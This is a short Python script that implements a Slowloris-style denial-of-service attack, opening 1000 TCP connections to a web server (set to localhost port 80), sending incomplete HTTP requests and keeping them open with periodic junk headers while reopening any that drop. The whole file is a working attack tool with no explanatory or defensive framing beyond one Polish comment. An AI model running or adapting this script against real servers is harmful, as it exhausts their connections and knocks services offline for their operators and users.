import socket
import time

HOST="localhost"
PORT=80

SOCK_COUNT = 1000

def init_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))

    sock.send(f"GET / HTTP/1.1\r\nHOST: {HOST}\r\nAccept: text/html\r\n".encode())
    return sock

def main():
    sockets = []
    
    for i in range(SOCK_COUNT):
        sock = init_socket()
        sockets.append(sock)

    while True:
        for sock in sockets:
            try:
                sock.send(b"X-a: b\r\n")
            except socket.error:
                sockets.remove(sock)

        # Dobudowujemy zamkniete sockety
        while len(sockets) < SOCK_COUNT:
            sock = init_socket()
            sockets.append(sock)
        
        time.sleep(100)



if __name__ == "__main__":
    main()
